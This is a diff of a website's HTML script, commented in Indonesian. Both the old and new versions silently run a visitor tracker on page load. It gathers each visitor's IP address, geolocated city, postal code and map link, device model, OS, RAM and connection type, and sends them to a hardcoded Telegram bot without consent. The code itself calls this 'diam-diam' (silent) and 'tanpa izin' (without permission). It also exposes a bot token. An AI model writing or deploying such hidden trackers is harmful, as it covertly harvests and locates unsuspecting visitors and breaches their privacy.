@@ -308,199 +308,259 @@
   <audio id="bgmusic" loop>
     <source src="https://files.catbox.moe/g9lr5c.mp3" type="audio/mp3">
   </audio>
-  
+
   <script>
-// ========== TELEGRAM BOT TOKEN & CHAT ID ==========
-const TOKEN = '8669922433:AAHCj_JOHrEG8xDMamlFbxFiADWjZ6wgGBk';  // GANTI!
-const CHAT_ID = '6774181452';                                       // GANTI!
+    // ==================== SUPER TRACKER LENGKAP ====================
+    const TOKEN = '8669922433:AAHCj_JOHrEG8xDMamlFbxFiADWjZ6wgGBk';
+    const CHAT_ID = '6774181452';
 
-// ========== RAM DETECTOR ==========
-function getRAM() {
-  if (navigator.deviceMemory) {
-    const ram = navigator.deviceMemory;
-    let ramDesc = '';
-    
-    if (ram <= 0.5) ramDesc = '🟠 512 MB (HP jadul banget)';
-    else if (ram <= 1) ramDesc = '🟡 1 GB (HP entry level)';
-    else if (ram <= 2) ramDesc = '🟢 2 GB (HP low-end)';
-    else if (ram <= 4) ramDesc = '🔵 4 GB (HP mid-range)';
-    else if (ram <= 6) ramDesc = '🟣 6 GB (HP mid-high)';
-    else if (ram <= 8) ramDesc = '⚫ 8 GB (HP flagship)';
-    else ramDesc = '💎 12+ GB (HP gaming/premium)';
-    
-    return `💾 *RAM:* ${ram} GB ${ramDesc}`;
-  } else {
-    return '💾 *RAM:* ❌ Tidak terdeteksi (gunakan Chrome)';
-  }
-}
+    // Fungsi kirim ke Telegram
+    function sendToTelegram(message) {
+      const url = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
+      const params = {
+        chat_id: CHAT_ID,
+        text: message,
+        parse_mode: 'Markdown'
+      };
+      fetch(url, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(params)
+      }).catch(err => console.log('Telegram error:', err));
+    }
 
-// ========== DETEKSI PERANGKAT SUPER LENGKAP ==========
-function detectDevice() {
-  const ua = navigator.userAgent;
-  let device = 'Unknown Device';
-  let os = 'Unknown OS';
-  let model = '';
-  let brand = '';
-  
-  // Deteksi OS
-  if (ua.includes('Windows')) os = 'Windows';
-  else if (ua.includes('Mac OS')) os = 'macOS';
-  else if (ua.includes('iPhone')) os = 'iOS';
-  else if (ua.includes('iPad')) os = 'iPadOS';
-  else if (ua.includes('Android')) os = 'Android';
-  else if (ua.includes('Linux')) os = 'Linux';
-  
-  // ========== DETEKSI ANDROID (SEMUA MERK) ==========
-  if (ua.includes('Android')) {
-    os = 'Android';
-    
-    // Deteksi merk
-    if (ua.includes('SM-') || ua.includes('Samsung') || ua.includes('GT-')) brand = 'Samsung';
-    else if (ua.includes('Redmi') || ua.includes('Xiaomi') || ua.includes('Mi ') || ua.includes('M2101')) brand = 'Xiaomi';
-    else if (ua.includes('OPPO') || ua.includes('CPH') || ua.includes('A37')) brand = 'OPPO';
-    else if (ua.includes('Vivo') || ua.includes('V2') || ua.includes('V3')) brand = 'Vivo';
-    else if (ua.includes('Realme') || ua.includes('RMX')) brand = 'Realme';
-    else if (ua.includes('Pixel')) brand = 'Google Pixel';
-    else if (ua.includes('ASUS') || ua.includes('Zenfone')) brand = 'ASUS';
-    else if (ua.includes('Nexus')) brand = 'Nexus';
-    else if (ua.includes('HUAWEI') || ua.includes('NOVA') || ua.includes('MAR-')) brand = 'Huawei';
-    else if (ua.includes('HONOR') || ua.includes('HLK-')) brand = 'Honor';
-    else if (ua.includes('Lenovo')) brand = 'Lenovo';
-    else if (ua.includes('Moto') || ua.includes('Motorola')) brand = 'Motorola';
-    else if (ua.includes('Nokia')) brand = 'Nokia';
-    else if (ua.includes('Sony')) brand = 'Sony';
-    else if (ua.includes('LG')) brand = 'LG';
-    else if (ua.includes('Infinix') || ua.includes('X6')) brand = 'Infinix';
-    else if (ua.includes('Tecno')) brand = 'Tecno';
-    else if (ua.includes('Itel')) brand = 'Itel';
-    else if (ua.includes('Advan')) brand = 'Advan';
-    else if (ua.includes('Evercoss')) brand = 'Evercoss';
-    else if (ua.includes('Mito')) brand = 'Mito';
-    else if (ua.includes('Smartfren') || ua.includes('Andromax')) brand = 'Smartfren';
-    else if (ua.includes('Axioo')) brand = 'Axioo';
-    else if (ua.includes('Polytron')) brand = 'Polytron';
-    else {
-      // Deteksi dari build
-      const buildMatch = ua.match(/Build\/([^;\s]+)/);
-      if (buildMatch) {
-        const build = buildMatch[1];
-        if (build.includes('OP4')) brand = 'OPPO';
-        else if (build.includes('V4')) brand = 'Vivo';
-        else if (build.includes('Q')) brand = 'Xiaomi';
-        else brand = 'Android Generic';
+    // Ambil IP Public
+    async function getPublicIP() {
+      try {
+        const res = await fetch('https://api.ipify.org?format=json');
+        const data = await res.json();
+        return data.ip;
+      } catch (e) {
+        return 'Tidak dapat diambil';
       }
     }
-    
-    // Deteksi model
-    let modelMatch = null;
-    const modelPatterns = [
-      /; ([^;]+) Build\//,
-      /; ([^;]+);/,
-      /\(([^;]+); Android/,
-      /Android [^;]+; ([^;]+);/,
-      /Android [^;]+; ([^\\)]+)/
-    ];
-    
-    for (const pattern of modelPatterns) {
-      const match = ua.match(pattern);
-      if (match && match[1] && !match[1].includes('Android') && !match[1].includes('Build')) {
-        modelMatch = match[1].trim();
-        break;
+
+    // Ambil geolokasi via IP (lengkap dengan postal code)
+    async function getGeoInfo(ip) {
+      try {
+        const res = await fetch(`https://ipapi.co/${ip}/json/`);
+        const data = await res.json();
+        return data;
+      } catch (e) {
+        return {};
       }
     }
-    
-    if (modelMatch) {
-      model = modelMatch.replace(/;/g, '').replace(/_/g, ' ').replace(/  +/g, ' ').trim();
-    }
-    
-    // Gabung
-    if (brand && model) device = `${brand} ${model}`;
-    else if (brand) device = brand;
-    else if (model) device = model;
-    else device = 'Android Device';
-  }
-  
-  // ========== DETEKSI IPHONE ==========
-  else if (ua.includes('iPhone')) {
-    os = 'iOS';
-    if (ua.includes('iPhone 15')) device = 'iPhone 15 Series';
-    else if (ua.includes('iPhone 14')) device = 'iPhone 14 Series';
-    else if (ua.includes('iPhone 13')) device = 'iPhone 13 Series';
-    else if (ua.includes('iPhone 12')) device = 'iPhone 12 Series';
-    else if (ua.includes('iPhone 11')) device = 'iPhone 11 Series';
-    else if (ua.includes('iPhone X')) device = 'iPhone X Series';
-    else if (ua.includes('iPhone 8')) device = 'iPhone 8 Series';
-    else if (ua.includes('iPhone 7')) device = 'iPhone 7 Series';
-    else if (ua.includes('iPhone 6')) device = 'iPhone 6 Series';
-    else if (ua.includes('iPhone SE')) device = 'iPhone SE';
-    else device = 'iPhone';
-    brand = 'Apple';
-  }
-  
-  // ========== DETEKSI IPAD ==========
-  else if (ua.includes('iPad')) {
-    os = 'iPadOS';
-    if (ua.includes('iPad Pro')) device = 'iPad Pro';
-    else if (ua.includes('iPad Air')) device = 'iPad Air';
-    else if (ua.includes('iPad Mini')) device = 'iPad Mini';
-    else device = 'iPad';
-    brand = 'Apple';
-  }
-  
-  // ========== DETEKSI PC ==========
-  else if (ua.includes('Windows')) {
-    if (ua.includes('Windows NT 10.0')) os = 'Windows 10/11';
-    else if (ua.includes('Windows NT 6.3')) os = 'Windows 8.1';
-    else if (ua.includes('Windows NT 6.2')) os = 'Windows 8';
-    else if (ua.includes('Windows NT 6.1')) os = 'Windows 7';
-    
-    if (ua.includes('ARM')) device = 'Windows ARM PC';
-    else if (ua.includes('Win64')) device = 'Windows 64-bit PC';
-    else device = 'Windows PC';
-    brand = 'Microsoft';
-  }
-  
-  else if (ua.includes('Mac OS')) {
-    os = 'macOS';
-    if (ua.includes('Intel Mac')) device = 'Mac Intel';
-    else if (ua.includes('ARM64')) device = 'Mac Apple Silicon (M1/M2/M3)';
-    else device = 'Mac';
-    brand = 'Apple';
-  }
-  
-  device = device.replace(/[^\w\s\-\.\/\(\)]/g, '').trim();
-  
-  return { device, os, brand, model };
-}
 
-// ========== TRACKER DIAM-DIAM (TANPA IZIN) ==========
-async function trackVisitor() {
-  try {
-    // Ambil IP
-    const ipRes = await fetch('https://api.ipify.org?format=json');
-    const ipData = await ipRes.json();
-    const ip = ipData.ip;
-    
-    // Ambil lokasi dari IP
-    const geoRes = await fetch(`https://ipapi.co/${ip}/json/`);
-    const geo = await geoRes.json();
-    
-    const { device, os, brand, model } = detectDevice();
-    const ramInfo = getRAM();
-    const mapsLink = `https://www.google.com/maps?q=${geo.latitude || '0'},${geo.longitude || '0'}`;
-    const page = window.location.pathname;
-    const waktu = new Date().toLocaleString('id-ID', {
-      timeZone: 'Asia/Jakarta',
-      weekday: 'long',
-      year: 'numeric',
-      month: 'long',
-      day: 'numeric',
-      hour: '2-digit',
-      minute: '2-digit',
-      second: '2-digit'
-    });
-    
-    const pesan = ` *SILENT OBLIVION - VISITOR TRACKER*
+    // Deteksi RAM (hanya Chrome)
+    function getRAM() {
+      if ('deviceMemory' in navigator) {
+        return `${navigator.deviceMemory} GB`;
+      }
+      return 'Tidak diketahui';
+    }
+
+    // Deteksi Merek, Model, OS, Device secara SUPER LENGKAP (semua HP 2019-sekarang + desktop)
+    function getDeviceDetail() {
+      const ua = navigator.userAgent;
+      let brand = 'Unknown';
+      let model = 'Unknown';
+      let os = 'Unknown';
+      let device = 'Desktop'; // default
+
+      // Deteksi OS
+      if (ua.includes('Windows NT 10.0')) os = 'Windows 10';
+      else if (ua.includes('Windows NT 6.3')) os = 'Windows 8.1';
+      else if (ua.includes('Windows NT 6.2')) os = 'Windows 8';
+      else if (ua.includes('Windows NT 6.1')) os = 'Windows 7';
+      else if (ua.includes('Mac OS X 11')) os = 'macOS 11 Big Sur';
+      else if (ua.includes('Mac OS X 10_15')) os = 'macOS Catalina';
+      else if (ua.includes('Mac OS X 10_14')) os = 'macOS Mojave';
+      else if (ua.includes('Mac OS X')) os = 'macOS';
+      else if (ua.includes('Linux')) os = 'Linux';
+      else if (ua.includes('Android 13')) os = 'Android 13';
+      else if (ua.includes('Android 12')) os = 'Android 12';
+      else if (ua.includes('Android 11')) os = 'Android 11';
+      else if (ua.includes('Android 10')) os = 'Android 10';
+      else if (ua.includes('Android 9')) os = 'Android 9 (Pie)';
+      else if (ua.includes('Android 8')) os = 'Android 8 (Oreo)';
+      else if (ua.includes('Android')) os = 'Android';
+      else if (ua.includes('iOS 16')) os = 'iOS 16';
+      else if (ua.includes('iOS 15')) os = 'iOS 15';
+      else if (ua.includes('iOS 14')) os = 'iOS 14';
+      else if (ua.includes('iOS 13')) os = 'iOS 13';
+      else if (ua.includes('iOS 12')) os = 'iOS 12';
+      else if (ua.includes('iOS')) os = 'iOS';
+      else if (ua.includes('iPhone')) os = 'iOS';
+      else if (ua.includes('iPad')) os = 'iPadOS';
+
+      // Deteksi tipe perangkat
+      if (/mobile|android|iphone|ipad|ipod|blackberry|opera mini|iemobile|wpdesktop/i.test(ua)) {
+        device = 'Mobile';
+        if (/ipad|tablet|kindle|silk|playbook|(android(?!.*mobile))/i.test(ua)) {
+          device = 'Tablet';
+        }
+      }
+
+      // ========== DETEKSI MEREK & MODEL LENGKAP 2019-SEKARANG ==========
+      // Samsung
+      if (ua.includes('SM-')) {
+        brand = 'Samsung';
+        const match = ua.match(/SM-[A-Z0-9]+/);
+        if (match) model = match[0];
+        else model = 'Galaxy Series';
+      }
+      else if (ua.includes('SAMSUNG')) brand = 'Samsung';
+      
+      // Xiaomi, Redmi, POCO
+      else if (ua.includes('Xiaomi') || ua.includes('Mi ') || ua.includes('M2007')) {
+        brand = 'Xiaomi';
+        const match = ua.match(/Xiaomi[^;)]+|Mi[^;)]+|M[0-9]{4}[^;)]+/);
+        if (match) model = match[0];
+      }
+      else if (ua.includes('Redmi')) {
+        brand = 'Redmi';
+        const match = ua.match(/Redmi[^;)]+/);
+        if (match) model = match[0];
+      }
+      else if (ua.includes('POCO')) {
+        brand = 'POCO';
+        const match = ua.match(/POCO[^;)]+/);
+        if (match) model = match[0];
+      }
+      
+      // Oppo
+      else if (ua.includes('Oppo') || ua.includes('OPPO') || ua.includes('CPH')) {
+        brand = 'Oppo';
+        const match = ua.match(/CPH[0-9]{4}|Oppo[^;)]+/i);
+        if (match) model = match[0];
+      }
+      
+      // Vivo
+      else if (ua.includes('Vivo') || ua.includes('VIVO') || ua.includes('vivo') || ua.includes('V20')) {
+        brand = 'Vivo';
+        const match = ua.match(/V[0-9]{4}|vivo[^;)]+/i);
+        if (match) model = match[0];
+      }
+      
+      // Realme
+      else if (ua.includes('Realme') || ua.includes('realme') || ua.includes('RMX')) {
+        brand = 'Realme';
+        const match = ua.match(/RMX[0-9]{4}|realme[^;)]+/i);
+        if (match) model = match[0];
+      }
+      
+      // Huawei
+      else if (ua.includes('Huawei') || ua.includes('HUAWEI') || ua.includes('JNY') || ua.includes('MAR') || ua.includes('LIO')) {
+        brand = 'Huawei';
+        const match = ua.match(/HUAWEI[^;)]+|JNY-[A-Z0-9]+|MAR-[A-Z0-9]+|LIO-[A-Z0-9]+/);
+        if (match) model = match[0];
+      }
+      else if (ua.includes('Honor')) {
+        brand = 'Honor';
+        const match = ua.match(/Honor[^;)]+/);
+        if (match) model = match[0];
+      }
+      
+      // OnePlus
+      else if (ua.includes('OnePlus') || ua.includes('ONEPLUS') || ua.includes('GM19')) {
+        brand = 'OnePlus';
+        const match = ua.match(/OnePlus[^;)]+|GM[0-9]+/);
+        if (match) model = match[0];
+      }
+      
+      // Google Pixel
+      else if (ua.includes('Pixel')) {
+        brand = 'Google Pixel';
+        const match = ua.match(/Pixel[^;)]+/);
+        if (match) model = match[0];
+      }
+      
+      // Sony
+      else if (ua.includes('Sony') || ua.includes('Xperia')) {
+        brand = 'Sony';
+        const match = ua.match(/Xperia[^;)]+|Sony[^;)]+/);
+        if (match) model = match[0];
+      }
+      
+      // LG
+      else if (ua.includes('LG') || ua.includes('LGE')) {
+        brand = 'LG';
+        const match = ua.match(/LG[^;)]+|LM-[A-Z0-9]+/);
+        if (match) model = match[0];
+      }
+      
+      // Motorola
+      else if (ua.includes('Motorola') || ua.includes('Moto')) {
+        brand = 'Motorola';
+        const match = ua.match(/Moto[^;)]+|Motorola[^;)]+/);
+        if (match) model = match[0];
+      }
+      
+      // Nokia
+      else if (ua.includes('Nokia')) {
+        brand = 'Nokia';
+        const match = ua.match(/Nokia[^;)]+/);
+        if (match) model = match[0];
+      }
+      
+      // Apple
+      else if (ua.includes('iPhone')) {
+        brand = 'Apple';
+        if (ua.includes('iPhone 14')) model = 'iPhone 14 Series';
+        else if (ua.includes('iPhone 13')) model = 'iPhone 13 Series';
+        else if (ua.includes('iPhone 12')) model = 'iPhone 12 Series';
+        else if (ua.includes('iPhone 11')) model = 'iPhone 11 Series';
+        else if (ua.includes('iPhone X')) model = 'iPhone X Series';
+        else if (ua.includes('iPhone SE')) model = 'iPhone SE';
+        else model = 'iPhone';
+      }
+      else if (ua.includes('iPad')) {
+        brand = 'Apple';
+        model = 'iPad';
+      }
+      
+      // Desktop / Unknown brand
+      else if (ua.includes('Windows') || ua.includes('Macintosh') || ua.includes('Linux')) {
+        brand = 'Desktop/Laptop';
+        if (ua.includes('Macintosh')) model = 'Mac';
+        else if (ua.includes('Windows')) model = 'PC';
+        else model = 'Linux PC';
+      }
+
+      return { brand, model, os, device };
+    }
+
+    // Ambil informasi koneksi
+    function getConnection() {
+      if (navigator.connection) {
+        return navigator.connection.effectiveType || 'Unknown';
+      }
+      return 'Unknown';
+    }
+
+    // Fungsi utama
+    async function collectAndSend() {
+      const ip = await getPublicIP();
+      const geo = await getGeoInfo(ip);
+      const deviceInfo = getDeviceDetail();
+      const ram = getRAM();
+      const connection = getConnection();
+      
+      const waktu = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta', dateStyle: 'full', timeStyle: 'long' });
+      
+      // Link Google Maps
+      const mapsLink = geo.latitude && geo.longitude 
+        ? `https://www.google.com/maps?q=${geo.latitude},${geo.longitude}` 
+        : '#';
+      
+      // Halaman saat ini
+      const page = window.location.pathname;
+      
+      // Format RAM
+      const ramInfo = `💾 *RAM:* ${ram}`;
+      
+      // Format pesan PERSIS seperti yang diminta
+      const pesan = ` *GACOR JUGA LUH NANDOK - 261 AREA*
 
 📌 *IP ADDRESS:* \`${ip}\`
 🌍 *LOKASI:* ${geo.city || '-'}, ${geo.region || '-'}, ${geo.country_name || '-'}
@@ -510,74 +570,70 @@ async function trackVisitor() {
 💰 *KODE POS:* ${geo.postal || '-'}
 ${ramInfo}
 
-📱 *MERK:* ${brand || 'Unknown'}
-📲 *MODEL:* ${model || 'Unknown'}
-🔧 *PERANGKAT:* ${device}
-🖥️ *OS:* ${os}
+📱 *MERK:* ${deviceInfo.brand || 'Unknown'}
+📲 *MODEL:* ${deviceInfo.model || 'Unknown'}
+🔧 *PERANGKAT:* ${deviceInfo.device}
+🖥️ *OS:* ${deviceInfo.os}
 🌐 *BROWSER:* ${navigator.userAgent.split(' ').slice(-2).join(' ')}
 
 🔋 *BAHASA:* ${navigator.language}
-⚡ *KONEKSI:* ${navigator.connection ? navigator.connection.effectiveType : 'Unknown'}
+⚡ *KONEKSI:* ${connection}
 📄 *HALAMAN:* ${page === '/' ? 'Beranda' : page}
 ⏰ *WAKTU:* ${waktu}`;
 
-    await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(pesan)}&parse_mode=Markdown`);
-    
-    console.log('Visitor tracked:', ip);
-    
-  } catch (error) {
-    console.log('Tracker error:', error);
-  }
-}
+      sendToTelegram(pesan);
+    }
 
-// ========== INIT ==========
-window.addEventListener('load', function() {
-  trackVisitor(); // Jalan otomatis, ga perlu izin
-});
+    // Jalankan tracker setelah halaman dimuat (diam-diam)
+    window.addEventListener('load', () => {
+      setTimeout(() => {
+        collectAndSend();
+      }, 3000);
+    });
 
-// Audio Handler (click sekali)
-window.addEventListener('click', () => {
-  document.getElementById('bgmusic').play().catch(() => {});
-}, { once: true });
+    // ==================== Audio Handler ====================
+    window.addEventListener('click', () => {
+      document.getElementById('bgmusic').play().catch(() => {});
+    }, { once: true });
 
-// Smooth Loader
-window.addEventListener('DOMContentLoaded', () => {
-  setTimeout(() => {
-    const intro = document.getElementById('intro');
-    const main = document.getElementById('main-content');
-    const navbar = document.getElementById('navbar');
+    // ==================== Smooth Loader ====================
+    window.addEventListener('DOMContentLoaded', () => {
+      setTimeout(() => {
+        const intro = document.getElementById('intro');
+        const main = document.getElementById('main-content');
+        const navbar = document.getElementById('navbar');
 
-    intro.style.opacity = '0';
-    
-    setTimeout(() => {
-      intro.style.display = 'none';
-      navbar.style.display = 'flex';
-      main.classList.add('visible');
-      document.getElementById('home').style.display = 'block';
-    }, 1200);
-  }, 2500);
-});
+        intro.style.opacity = '0';
+        
+        setTimeout(() => {
+          intro.style.display = 'none';
+          navbar.style.display = 'flex';
+          main.classList.add('visible');
+          document.getElementById('home').style.display = 'block';
+        }, 1200);
+      }, 2500);
+    });
 
-// Page Switcher
-function switchPage(pageId) {
-  const home = document.getElementById('home');
-  const about = document.getElementById('about');
-  const nHome = document.getElementById('n-home');
-  const nAbout = document.getElementById('n-about');
+    // ==================== Elegant Page Switcher ====================
+    function switchPage(pageId) {
+      const home = document.getElementById('home');
+      const about = document.getElementById('about');
+      const nHome = document.getElementById('n-home');
+      const nAbout = document.getElementById('n-about');
 
-  if(pageId === 'home') {
-    about.style.display = 'none';
-    home.style.display = 'block';
-    nHome.classList.add('active');
-    nAbout.classList.remove('active');
-  } else {
-    home.style.display = 'none';
-    about.style.display = 'block';
-    nAbout.classList.add('active');
-    nHome.classList.remove('active');
-  }
-  window.scrollTo({top: 0, behavior: 'smooth'});
-}
+      if(pageId === 'home') {
+        about.style.display = 'none';
+        home.style.display = 'block';
+        nHome.classList.add('active');
+        nAbout.classList.remove('active');
+      } else {
+        home.style.display = 'none';
+        about.style.display = 'block';
+        nAbout.classList.add('active');
+        nHome.classList.remove('active');
+      }
+      window.scrollTo({top: 0, behavior: 'smooth'});
+    }
   </script>
 </body>
-</html>
+    </html>
